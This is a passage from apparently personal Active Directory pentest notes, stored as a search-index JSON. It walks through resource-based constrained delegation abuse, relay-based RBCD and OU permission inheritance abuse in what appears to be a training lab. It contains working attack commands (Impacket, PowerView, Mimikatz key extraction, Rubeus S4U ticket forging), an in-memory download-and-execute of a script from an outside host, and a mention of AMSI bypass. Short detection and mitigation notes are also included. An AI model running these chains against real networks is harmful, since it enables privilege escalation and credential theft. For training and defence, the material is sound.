WEB01"},{"id":"what-happens-when-we-configure-rbcd","u":"01_attacks-lateral-movement.html#what-happens-when-we-configure-rbcd","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ What Happens When We Configure RBCD","c":"When we run a command like: impacket-rbcd -delegate-from ATTACKER$ -delegate-to WEB01$ The tool does this internally: Queries SID of ATTACKER$ Builds a security descriptor Writes it into msDS-AllowedToActOnBehalfOfOtherIdentity of: WEB01$ So AD now contains something like: WEB01$ └─ msDS-AllowedToActOnBehalfOfOtherIdentity └─ Allow SID: S-1-5-21-XXXX-XXXX-XXXX-1234 (ATTACKER$)"},{"id":"now-comes-the-kerberos-part","u":"01_attacks-lateral-movement.html#now-comes-the-kerberos-part","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Now Comes the Kerberos Part","c":"When the attacker performs this: impacket-getST \\ -impersonate Administrator \\ -spn cifs/web01.domain.local Two Kerberos extensions are used: S4U2Self S4U2Proxy The important check happens during S4U2Proxy ."},{"id":"step-1-attacker-authenticates-as-service","u":"01_attacks-lateral-movement.html#step-1-attacker-authenticates-as-service","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ Step 1 — Attacker Authenticates as Service","c":"The attacker first authenticates to the KDC as: ATTACKER$ Using password or NT hash. This gives a TGT . ATTACKER$ → TGT So now the attacker has a Kerberos identity as the service ."},{"id":"step-2-s4u2self-request","u":"01_attacks-lateral-movement.html#step-2-s4u2self-request","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Step 2 — S4U2Self Request","c":"The service asks the KDC: Give me a service ticket for Administrator to myself Meaning: Administrator → ATTACKER$ Request contains: User to impersonate: Administrator Service requesting: ATTACKER$ KDC checks: Is ATTACKER$ a valid service? Yes (it has SPNs). So it issues a ticket: Administrator → ATTACKER$ Important: This ticket is marked: FORWARDABLE This is critical for delegation."},{"id":"step-3-s4u2proxy-request","u":"01_attacks-lateral-movement.html#step-3-s4u2proxy-request","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Step 3 — S4U2Proxy Request","c":"Now attacker asks the KDC: I have a ticket for Administrator. Allow me to access WEB01 as Administrator. This is the delegation request . Request contains: User: Administrator Delegating service: ATTACKER$ Target service: cifs/web01 Now the KDC must decide: Is ATTACKER$ allowed to delegate to WEB01?"},{"id":"what-the-kdc-does-internally","u":"01_attacks-lateral-movement.html#what-the-kdc-does-internally","sec":"Attacks + Lateral Movement","lvl":3,"t":"7️⃣ What the KDC Does Internally","c":"The KDC performs these checks:"},{"id":"step-1","u":"01_attacks-lateral-movement.html#step-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 1","c":"Find the target service object. WEB01$"},{"id":"step-2","u":"01_attacks-lateral-movement.html#step-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 2","c":"Read attribute: msDS-AllowedToActOnBehalfOfOtherIdentity"},{"id":"step-3","u":"01_attacks-lateral-movement.html#step-3","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 3","c":"Extract the security descriptor . Example inside: ALLOW SID: ATTACKER$"},{"id":"step-4","u":"01_attacks-lateral-movement.html#step-4","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 4","c":"Compare requesting service SID. Requestor = ATTACKER$"},{"id":"step-5","u":"01_attacks-lateral-movement.html#step-5","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 5","c":"Evaluate ACL. Conceptually: if ATTACKER$ SID ∈ allowed list allow delegation else deny"},{"id":"if-the-check-passes","u":"01_attacks-lateral-movement.html#if-the-check-passes","sec":"Attacks + Lateral Movement","lvl":3,"t":"8️⃣ If the Check Passes","c":"The KDC generates a service ticket : Administrator → WEB01 Example SPN: cifs/web01.domain.local Now the attacker has: Administrator service ticket for WEB01"},{"id":"what-the-ticket-contains","u":"01_attacks-lateral-movement.html#what-the-ticket-contains","sec":"Attacks + Lateral Movement","lvl":3,"t":"9️⃣ What the Ticket Contains","c":"The TGS contains: Client: Administrator Service: WEB01 Delegated by: ATTACKER$ But WEB01 only sees : Client: Administrator So WEB01 believes: Administrator authenticated It does not know delegation happened ."},{"id":"why-the-kdc-trusts-this","u":"01_attacks-lateral-movement.html#why-the-kdc-trusts-this","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣1️⃣ Why the KDC Trusts This","c":"Because RBCD tells the KDC: The resource (WEB01) explicitly trusts ATTACKER$ So the logic becomes: WEB01 says ATTACKER$ can impersonate users to it Therefore the KDC is allowed to generate: Administrator → WEB01"},{"id":"why-the-attack-works-even-if-admin-never-logged-in","u":"01_attacks-lateral-movement.html#why-the-attack-works-even-if-admin-never-logged-in","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣2️⃣ Why the Attack Works Even If Admin Never Logged In","c":"Because the KDC does not verify that the user authenticated to the service . Kerberos assumption: Trusted services can request tickets for users This is required for: Web servers SQL servers SharePoint Exchange So the KDC allows the service to act on behalf of the user ."},{"id":"simplified-real-world-analogy","u":"01_attacks-lateral-movement.html#simplified-real-world-analogy","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣3️⃣ Simplified Real-World Analogy","c":"Imagine a building. WEB01 = secure room ATTACKER$ = receptionist Administrator = CEO WEB01 writes in its policy: Receptionist is allowed to bring anyone into the room. Now receptionist tells security: The CEO needs access to WEB01. Security checks: Does WEB01 trust receptionist? Yes. So security opens the door. Even if the CEO never came to the building. ✅ Final Key Understanding The KDC does not blindly trust the service . It verifies delegation using: msDS-AllowedToActOnBehalfOfOtherIdentity stored on the target resource . If the requesting service SID is inside that security descriptor , the KDC issues the delegated TGS."},{"id":"conditions-to-work","u":"01_attacks-lateral-movement.html#conditions-to-work","sec":"Attacks + Lateral Movement","lvl":3,"t":"Conditions To Work","c":"Generic All / Write on Computer 🧠 Core Requirement for RBCD To abuse: Set-DomainObject-IdentityTARGET$-Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID} 👉 You need: A machine account YOU control ❓ Your Question Do we need to create a machine account (MachineAccountQuota=10) or already have one? 👉 ✔ BOTH are valid paths"},{"id":"case-1-machineaccountquota-0-default-10","u":"01_attacks-lateral-movement.html#case-1-machineaccountquota-0-default-10","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 1. Case 1 — MachineAccountQuota > 0 (DEFAULT = 10)","c":"🧠 What it means Any domain user can create up to 10 computer accounts"},{"id":"step-by-step","u":"01_attacks-lateral-movement.html#step-by-step","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚔️ Step-by-Step","c":"Step 1 — Create machine account impacket-addcomputer domain.local/user:pass-computer-name ATTACKER$ -computer -pass Pass123! Step 2 — Get SID of machine impacket-lookupsid domain.local/user:pass@DC_IP Step 3 — Set RBCD on target Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID} ✅ Result 👉 Your fake machine can now impersonate users to TARGET"},{"id":"case-2-machineaccountquota-0","u":"01_attacks-lateral-movement.html#case-2-machineaccountquota-0","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 2. Case 2 — MachineAccountQuota = 0","c":"🧠 What it means You cannot create new machines ⚔️ What you need 👉 Already compromised: A computer account (e.g., WS01$ ) OR credentials/hash of a machine ✔ Example You dumped credentials of: WS01$ 👉 Use that instead of creating new one ✅ Result 👉 Same RBCD attack works"},{"id":"case-3-you-already-have-a-computer-account","u":"01_attacks-lateral-movement.html#case-3-you-already-have-a-computer-account","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 3. Case 3 — You already have a computer account","c":"🧠 Example You compromised: WEB01$ APP01$ 👉 Directly use its SID"},{"id":"important-requirement-very-important","u":"01_attacks-lateral-movement.html#important-requirement-very-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Requirement (VERY IMPORTANT)","c":"You must control a principal that supports delegation ✔ Valid principals: Computer accounts ✅ Service accounts (rare cases) ✅ ❌ Normal users → NOT useful for RBCD"},{"id":"genericall-on-ou","u":"01_attacks-lateral-movement.html#genericall-on-ou","sec":"Attacks + Lateral Movement","lvl":3,"t":"GenericAll on OU","c":""},{"id":"key-concept-inheritance-in-ad","u":"01_attacks-lateral-movement.html#key-concept-inheritance-in-ad","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Key Concept: Inheritance in AD","c":"🧩 Two things matter 1. Is inheritance enabled on child objects? Each object (user/computer) has: \"Protect object from inheritance\" ✅ Disabled → inherits permissions from OU ❌ Enabled → blocks inheritance 2. Did your ACE include inheritance flags? When you run: Add-DomainObjectAcl -Rights All 👉 By default, it may NOT apply to child objects unless inheritance flags are set"},{"id":"so-what-really-happens","u":"01_attacks-lateral-movement.html#so-what-really-happens","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 So what really happens?","c":"Case 1: No inheritance flags set ❌ 👉 You only control: OU=IT You DO NOT control : Users inside OU Computers inside OU Case 2: Inheritance flags enabled ✅ If ACE is applied like: This object + Descendant objects AND Child objects allow inheritance 👉 Then: OU → permissions flow down → users/computers"},{"id":"when-exploitation-works","u":"01_attacks-lateral-movement.html#when-exploitation-works","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚔️ When exploitation works","c":"✅ Full abuse condition You need BOTH: ACE with inheritance flags Child objects not blocking inheritance 💥 Result Then you can: Reset passwords of users Add users to groups Modify computer objects Perform attacks like: RBCD (on computers) Force password change Shadow credentials"},{"id":"step-1-add-rights-over-user-objects","u":"01_attacks-lateral-movement.html#step-1-add-rights-over-user-objects","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Step 1: Add rights over USER objects","c":"Add-DomainObjectAcl ` -TargetIdentity\"OU=IT,DC=domain,DC=local\" ` -PrincipalIdentityattacker ` -RightsResetPassword ` -InheritanceTypeDescendents ` -TargetTypeUser"},{"id":"step-2-add-rights-over-computer-objects","u":"01_attacks-lateral-movement.html#step-2-add-rights-over-computer-objects","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Step 2: Add rights over COMPUTER objects","c":"Add-DomainObjectAcl ` -TargetIdentity\"OU=IT,DC=domain,DC=local\" ` -PrincipalIdentityattacker ` -RightsAll ` -InheritanceTypeDescendents ` -TargetTypeComputer"},{"id":"what-this-does","u":"01_attacks-lateral-movement.html#what-this-does","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 What this does","c":"👉 You are telling Active Directory: “Apply these permissions to all child user/computer objects inside this OU”"},{"id":"verify-it-worked","u":"01_attacks-lateral-movement.html#verify-it-worked","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Verify it worked","c":"Check ACLs Get-DomainObjectAcl -Identity \"OU=IT,DC=domain,DC=local\" -ResolveGUIDs Look for: InheritedObjectType: User InheritedObjectType: Computer"},{"id":"step-3-check-if-inheritance-is-blocked","u":"01_attacks-lateral-movement.html#step-3-check-if-inheritance-is-blocked","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Step 3 — Check if inheritance is blocked","c":"Even if you did everything right… 👉 child objects might have: \"Protect object from inheritance\" 🔎 Check via PowerView Get-DomainUser-SearchBase\"OU=IT,DC=domain,DC=local\"| Get-ObjectAcl 🔎 Or manually (GUI) Open ADUC User → Properties → Security → Advanced Check: \"Enable inheritance\""},{"id":"rbcd-relay-attacks","u":"01_attacks-lateral-movement.html#rbcd-relay-attacks","sec":"Attacks + Lateral Movement","lvl":3,"t":"RBCD + Relay Attacks","c":""},{"id":"step-1-forcing-web01-to-authenticate","u":"01_attacks-lateral-movement.html#step-1-forcing-web01-to-authenticate","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Step 1 — Forcing WEB01 to Authenticate","c":"You forced WEB01 to connect to your machine using a coercion technique. Imagine the attacker tells WEB01: “Hey WEB01, go check this network share for me.” So WEB01 tries to access: \\\\attacker\\share Because it is a Windows machine, it automatically authenticates using its machine account: WEB01$ So the authentication flow becomes: WEB01 → Attacker Authentication identity: WEB01$"},{"id":"step-2-relaying-that-authentication-to-the-domain-controller","u":"01_attacks-lateral-movement.html#step-2-relaying-that-authentication-to-the-domain-controller","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔁 Step 2 — Relaying That Authentication to the Domain Controller","c":"Instead of accepting that authentication, your relay server forwards it to the Domain Controller. So the flow becomes: WEB01 → Attacker → Domain Controller To the Domain Controller it looks like: “WEB01 is connecting to LDAP.” So now the Domain Controller believes the attacker is WEB01$ . Meaning the attacker temporarily has WEB01’s privileges in Active Directory ."},{"id":"step-3-creating-an-attacker-machine","u":"01_attacks-lateral-movement.html#step-3-creating-an-attacker-machine","sec":"Attacks + Lateral Movement","lvl":3,"t":"🏗 Step 3 — Creating an Attacker Machine","c":"Active Directory has a default rule: Any authenticated user or machine can create up to 10 computer accounts . So while the attacker is authenticated as WEB01$ , the relay attack creates a new computer object in Active Directory. Example: Computer created: SWJFVMVD$ Now inside AD there is a new machine object that you control . Think of it like adding a new computer to the domain: Domain Computers ├─ WEB01 ├─ DC01 └─ SWJFVMVD ← attacker machine The attacker now knows the password of this machine account , so it can authenticate as it anytime."},{"id":"step-4-setting-the-rbcd-permission","u":"01_attacks-lateral-movement.html#step-4-setting-the-rbcd-permission","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧩 Step 4 — Setting the RBCD Permission","c":"Now the relay attack performs the most important step. A computer account can often modify certain attributes of its own object . It modifies a setting on WEB01 . The setting is an attribute called: msDS-AllowedToActOnBehalfOfOtherIdentity This attribute means: “Which machines are allowed to impersonate users when accessing this server?” The relay attack updates it so that: WEB01 allows SWJFVMVD$ Conceptually inside Active Directory it becomes: WEB01 trusts SWJFVMVD$ to act on behalf of users This is the Resource-Based Constrained Delegation configuration . Important detail: RBCD is set on the target server . So in your attack: RBCD is set on WEB01 not on the attacker machine."},{"id":"step-5-attacker-uses-the-new-machine-identity","u":"01_attacks-lateral-movement.html#step-5-attacker-uses-the-new-machine-identity","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎭 Step 5 — Attacker Uses the New Machine Identity","c":"Now the attacker logs in as the machine that was created earlier: SWJFVMVD$ Think of it as: “I am now operating as the computer SWJFVMVD in the domain.” This machine account is treated as a service account in Kerberos. That means it can use a feature called S4U delegation ."},{"id":"step-6-first-kerberos-trick-s4u2self","u":"01_attacks-lateral-movement.html#step-6-first-kerberos-trick-s4u2self","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎭 Step 6 — First Kerberos Trick (S4U2Self)","c":"The attacker machine asks the Domain Controller: “I am SWJFVMVD. Please give me a ticket for user Administrator to myself.” Even though Administrator never logged in, the Domain Controller allows this request. So the Domain Controller creates a ticket that says: User: Administrator Service: SWJFVMVD Meaning: SWJFVMVD is acting on behalf of Administrator. But this ticket still cannot access WEB01 yet ."},{"id":"step-7-second-kerberos-trick-s4u2proxy","u":"01_attacks-lateral-movement.html#step-7-second-kerberos-trick-s4u2proxy","sec":"Attacks + Lateral Movement","lvl":3,"t":"📁 Step 7 — Second Kerberos Trick (S4U2Proxy)","c":"Now SWJFVMVD asks the Domain Controller again: “I have a ticket representing Administrator. I want to access WEB01 as Administrator.” Before granting that ticket, the Domain Controller checks the delegation policy. It checks the attribute on WEB01 : msDS-AllowedToActOnBehalfOfOtherIdentity And it sees: SWJFVMVD$ is allowed So the Domain Controller approves the request."},{"id":"step-8-final-ticket-issued","u":"01_attacks-lateral-movement.html#step-8-final-ticket-issued","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎟 Step 8 — Final Ticket Issued","c":"The Domain Controller now creates a new ticket: User: Administrator Service: WEB01 This ticket basically says: “Administrator is accessing WEB01.” But in reality, the attacker is holding the ticket."},{"id":"step-9-attacker-accesses-web01","u":"01_attacks-lateral-movement.html#step-9-attacker-accesses-web01","sec":"Attacks + Lateral Movement","lvl":3,"t":"🖥 Step 9 — Attacker Accesses WEB01","c":"Now the attacker connects to WEB01 and presents the ticket. WEB01 reads it and sees: User = Administrator Because the ticket came from the Domain Controller, WEB01 trusts it completely. So the attacker is now effectively: Administrator on WEB01"},{"id":"why-computer-account-creation-is-important","u":"01_attacks-lateral-movement.html#why-computer-account-creation-is-important","sec":"Attacks + Lateral Movement","lvl":3,"t":"Why Computer Account Creation Is Important ??","c":""},{"id":"yes-users-can-have-spns","u":"01_attacks-lateral-movement.html#yes-users-can-have-spns","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Yes — Users Can Have SPNs","c":"In Active Directory, SPNs are not limited to computers . You can assign an SPN to: Computer accounts Service accounts (user accounts) Managed service accounts (gMSA) Example user service account: sqlsvc Assign an SPN: setspn -S MSSQLSvc/sql01.domain.local sqlsvc Now Kerberos knows: MSSQLSvc/sql01.domain.local → sqlsvc That means the user account is now a Kerberos service . So technically: ✔ Yes — a user with an SPN can perform S4U operations ."},{"id":"so-why-do-attackers-create-a-computer","u":"01_attacks-lateral-movement.html#so-why-do-attackers-create-a-computer","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ So Why Do Attackers Create a Computer?","c":"Because any domain user can create a computer by default , but cannot modify SPNs on arbitrary users . Default AD setting: MachineAccountQuota = 10 Meaning: Any authenticated user can run something like: impacket-addcomputer and create: ATTACKER$ No special privileges needed. But adding an SPN to a user usually requires: GenericWrite WriteProperty ServicePrincipalName write permissions on that user. So from an attacker perspective: Option | Requirement | — | — | Create machine | Works with any domain user | Add SPN to user | Requires privileges | That’s the main reason ."},{"id":"computer-accounts-already-have-spns","u":"01_attacks-lateral-movement.html#computer-accounts-already-have-spns","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Computer Accounts Already Have SPNs","c":"When you create a machine, AD automatically assigns several SPNs. Example: HOST/ATTACKER HOST/ATTACKER.domain.local CIFS/ATTACKER So the machine is immediately usable as a Kerberos service . No configuration needed. That makes it perfect for: S4U2Self S4U2Proxy"},{"id":"kerberos-needs-a-service-to-perform-s4u","u":"01_attacks-lateral-movement.html#kerberos-needs-a-service-to-perform-s4u","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ Kerberos Needs a Service to Perform S4U","c":"For S4U to work, the requesting account must be a service identity . That means it must have an SPN. Example: Service → requests ticket for user Example flow: ATTACKER$ → requests ticket for Administrator Kerberos allows it because: ATTACKER$ has SPNs"},{"id":"could-we-use-a-user-instead","u":"01_attacks-lateral-movement.html#could-we-use-a-user-instead","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Could We Use a User Instead?","c":"Yes — if you control a user account with an SPN . Example: svc_web SPN: HTTP/web.domain.local Then the attack could be: svc_web → impersonate Administrator → WEB01 This works exactly the same way . But again, attackers rarely have rights to add SPNs."},{"id":"example-comparison","u":"01_attacks-lateral-movement.html#example-comparison","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Example Comparison","c":"Method 1 — Using Computer (Common) Step 1 impacket-addcomputer pirate.htb/user:pass -computer-name ATTACKER$ Step 2 Set RBCD impacket-rbcd -delegate-from ATTACKER$ -delegate-to WEB01$ Step 3 impacket-getST -impersonate Administrator Done. Method 2 — Using User (Rare) You would need: GenericWrite on user account Then: setspn -S HTTP/fake.domain svc_user Then the RBCD attack works. But you already needed privileges , so the machine method is simpler."},{"id":"why-most-attack-chains-use-computers","u":"01_attacks-lateral-movement.html#why-most-attack-chains-use-computers","sec":"Attacks + Lateral Movement","lvl":3,"t":"7️⃣ Why Most Attack Chains Use Computers","c":"Because it works with zero privileges . Default AD configuration: MachineAccountQuota = 10 So every domain user can create machines. That means an attacker with just: Domain user credentials can obtain a Kerberos service identity . That’s why almost every tool (Impacket, ntlmrelayx, Powermad) creates machines."},{"id":"windows-setup-example-poc-2","u":"01_attacks-lateral-movement.html#windows-setup-example-poc-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Windows Setup + Example ( PoC )","c":""},{"id":"exploiting-rbcd","u":"01_attacks-lateral-movement.html#exploiting-rbcd","sec":"Attacks + Lateral Movement","lvl":3,"t":"🛠️ 1 . Exploiting RBCD","c":""},{"id":"step-by-step-attack-chain","u":"01_attacks-lateral-movement.html#step-by-step-attack-chain","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step-by-step Attack Chain:","c":"image.png"},{"id":"step-1-configure-rbcd-set-msds-allowedtoactonbehalfofotheridentity","u":"01_attacks-lateral-movement.html#step-1-configure-rbcd-set-msds-allowedtoactonbehalfofotheridentity","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 1: Configure RBCD (Set msDS-AllowedToActOnBehalfOfOtherIdentity )","c":"Before exploiting RBCD we often have to first configure it on the target system and this done by taking the access of the system, So first we have to take the remote access of the system. Using your access, configure the delegation settings on dcorp-mgmt Examples: First get access to ciadmin using jenkin, refer privilege escalation video. image.png Disable script logging bypass and amsi: image.png Download and execute powerview in memory: iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.64/powerview.ps1')) image.png Setting RBCD on dcorp-mgmt : Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std464$' -Verbose This adds dcorp-student1$ and to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on dcorp-mgmt$ image.png for above dcorp-mgmt is the second hop and we are saying “for dcorp-mgmt allow delegation from dcorp-student (first hop)”. Note:- We must have local admin rights on device which we are adding for delegation( dcorp-student ). Same using AD module: $comps = 'dcorp-student1$','dcorp-student2$' Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps This adds dcorp-student1$ and dcorp-student2$ to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on dcorp-mgmt$ . Now, these machines can impersonate any domain user to the dcorp-mgmt service using S4U2Self + S4U2Proxy flow. dcorp-student1$ and dcorp-student2$ are the machine on machine on will act as first hop and dcorp-mgmt$ will be second hop. Checking whether the RBCD has been set: Get-DomainRBCD image.png From above image we can see that student1 machine has been added to delegation list. So, now using Student1 account we can access any service on DCORP-MGMT$ on behalf of any user."},{"id":"step-2-extract-aes-key-from-controlled-computer-account","u":"01_attacks-lateral-movement.html#step-2-extract-aes-key-from-controlled-computer-account","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 2: Extract AES Key from Controlled Computer Account","c":"From new elevated shell, use Mimikatz to extract AES256 key from dcorp-student1$ : Invoke-Mimikatz -Command '\"sekurlsa::ekeys\"' Or C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\SafetyKatz.exe -agrs \"sekurlsa::evasive-keys\" \"exit\" This gives you the Kerberos long-term key for the computer account (needed for forging tickets via S4U2Self). image.png image.png from above image we can see that there are two student1 accounts and they both have different keys, now how to know which account to target? - look at SID, the SID of 1st account denotes that its a virtual account, which systems keeps on creating and deleting on itself, while second student1 account has valid SID, hence we will target second account."},{"id":"step-3-use-rubeus-to-perform-s4u2self-s4u2proxy","u":"01_attacks-lateral-movement.html#step-3-use-rubeus-to-perform-s4u2self-s4u2proxy","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 3: Use Rubeus to Perform S4U2Self + S4U2Proxy","c":"With the key in hand, you can impersonate any user (say, Administrator ) and access dcorp-mgmt : C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args s4u /user:dcorp-student1$ /aes256:<AESKEY> /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt Exmaple:- C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args s4u /user:dcorp-std464$ /aes256:ccbc0dea361939622730abe237913939afcb84ee53f401b6f6c6316538a66712/ impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args s4u /user:dcorp-studentX$ /aes256:ccbc0dea361939622730abe237913939afcb84ee53f401b6f6c6316538a66712 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt s4u : Initiates the S4U process impersonateuser : The user you want to impersonate msdsspn : The SPN of the backend service ( dcorp-mgmt ) /ptt : Pass-the-ticket directly into memory image.png image.png To view whether you got the ticket run klist command. image.png"},{"id":"step-4-access-the-backend-host","u":"01_attacks-lateral-movement.html#step-4-access-the-backend-host","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 4: Access the Backend Host","c":"Now you have a Kerberos ticket that allows you to impersonate Administrator on dcorp-mgmt . Use WinRS or PSRemoting to access: winrs -r:dcorp-mgmt cmd.exe ✅ You now have Administrator access on dcorp-mgmt , impersonating through the trusted delegation path. image.png"},{"id":"summary-of-attack-path","u":"01_attacks-lateral-movement.html#summary-of-attack-path","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔎 Summary of Attack Path:","c":"You control dcorp-student1$ (via admin access to student VM). You have write permissions to msDS-AllowedToActOnBehalfOfOtherIdentity on dcorp-mgmt . You configure RBCD so dcorp-student1$ is trusted to delegate. Extract AES key of dcorp-student1$ via Mimikatz. Use Rubeus to impersonate Administrator to dcorp-mgmt . Access dcorp-mgmt as Administrator ."},{"id":"additional-notes-detection","u":"01_attacks-lateral-movement.html#additional-notes-detection","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚨 Additional Notes & Detection","c":""},{"id":"detection-1","u":"01_attacks-lateral-movement.html#detection-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔍 Detection:","c":"Event ID 4769 : TGS requests, especially for sensitive users Event ID 4624 : Logon events showing unusual user logons from machine accounts Monitor modifications to msDS-AllowedToActOnBehalfOfOtherIdentity via Directory Services Changes auditing Flag any use of S4U2Self/S4U2Proxy (e.g., via Rubeus)"},{"id":"mitigation-3","u":"01_attacks-lateral-movement.html#mitigation-3","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧱 Mitigation:","c":"Restrict who can write to msDS-AllowedToActOnBehalfOfOtherIdentity Lower ms-DS-MachineAccountQuota to 0 if not needed Monitor ACLs using BloodHound or PowerView Avoid giving unnecessary write access to computer accounts"},{"id":"can-user-account-enough","u":"01_attacks-lateral-movement.html#can-user-account-enough","sec":"Attacks + Lateral Movement","lvl":3,"t":"Can User Account Enough ??","c":""},{"id":"starting-situation","u":"01_attacks-lateral-movement.html#starting-situation","sec":"Attacks + Lateral Movement","lvl":3,"t":"1️⃣ Starting Situation","c":"Suppose you find in BloodHound : attacker_user │ GenericWrite │ FILE01$ Meaning: attacker_user can modify FILE01$ attributes One of those attributes is: msDS-AllowedToActOnBehalfOfOtherIdentity So the user can configure RBCD on FILE01 ."},{"id":"key-rule-to-remember","u":"01_attacks-lateral-movement.html#key-rule-to-remember","sec":"Attacks + Lateral Movement","lvl":3,"t":"Key Rule to Remember","c":"For RBCD delegation: Delegating account must have an SPN So attackers usually use: Computer accounts Service accounts instead of normal users."},{"id":"first-thought-your-idea","u":"01_attacks-lateral-movement.html#first-thought-your-idea","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ First Thought (Your Idea)","c":"You might think: FILE01$ msDS-AllowedToActOnBehalfOfOtherIdentity: attacker_user Meaning: attacker_user can impersonate users to FILE01 But here’s the catch."},{"id":"why-a-normal-user-usually-fails","u":"01_attacks-lateral-movement.html#why-a-normal-user-usually-fails","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ Why a Normal User Usually Fails","c":"RBCD ultimately relies on Kerberos service delegation . To perform the S4U steps, the delegating account must behave like a service . That means the account must have an SPN (Service Principal Name) . Typical accounts with SPNs: Computer accounts Service accounts Accounts running services Normal users usually do not have SPNs , so they cannot request the required service tickets for S4U2Self/S4U2Proxy . So this setup normally won’t work directly : FILE01$ msDS-AllowedToActOnBehalfOfOtherIdentity: attacker_user"},{"id":"if-you-control-a-user-account","u":"01_attacks-lateral-movement.html#if-you-control-a-user-account","sec":"Attacks + Lateral Movement","lvl":3,"t":"If You Control a User Account","c":"If you compromise a user account and can modify its attributes, you can add an SPN. Example: user: attacker_user Add SPN: HTTP/fake Now that user behaves like a Kerberos service ."},{"id":"now-the-delegation-works","u":"01_attacks-lateral-movement.html#now-the-delegation-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Now the Delegation Works","c":"Because the user now has an SPN, Kerberos treats it like a service. The user can perform the delegation steps. Step 1 — S4U2Self The account requests: Administrator → attacker_user Ticket returned: Administrator → attacker_user Step 2 — S4U2Proxy Then the account requests: Administrator → FILE01 The KDC checks FILE01’s delegation attribute: msDS-AllowedToActOnBehalfOfOtherIdentity Sees: attacker_user allowed So it issues: Administrator → FILE01"},{"id":"result-1","u":"01_attacks-lateral-movement.html#result-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"6️⃣ Result","c":"The attacker can now access FILE01 as Administrator . Example services might include: CIFS/FILE01 HOST/FILE01 RPC/FILE01"},{"id":"why-attackers-often-use-computers-instead","u":"01_attacks-lateral-movement.html#why-attackers-often-use-computers-instead","sec":"Attacks + Lateral Movement","lvl":3,"t":"7️⃣ Why Attackers Often Use Computers Instead","c":"Even though the user+SPN trick works , attackers often just create a computer account because: Computer accounts automatically: have SPNs support delegation operations integrate smoothly with Kerberos tooling And they can usually create them because of: MachineAccountQuota (default = 10)"},{"id":"the-attack-pattern-you-described","u":"01_attacks-lateral-movement.html#the-attack-pattern-you-described","sec":"Attacks + Lateral Movement","lvl":3,"t":"8️⃣ The Attack Pattern You Described","c":"Your chain would look like this: Compromise user │ Add SPN to user │ GenericWrite on target computer │ Set RBCD │ S4U2Self │ S4U2Proxy │ Impersonate Administrator to target This is a valid RBCD abuse scenario ."},{"id":"rodc-golden-ticket-keylist-attack---extra","u":"01_attacks-lateral-movement.html#rodc-golden-ticket-keylist-attack---extra","sec":"Attacks + Lateral Movement","lvl":2,"t":"RODC = Golden Ticket + Keylist Attack - Extra","c":""},{"id":"what-is-rodc","u":"01_attacks-lateral-movement.html#what-is-rodc","sec":"Attacks + Lateral Movement","lvl":3,"t":"What is RODC 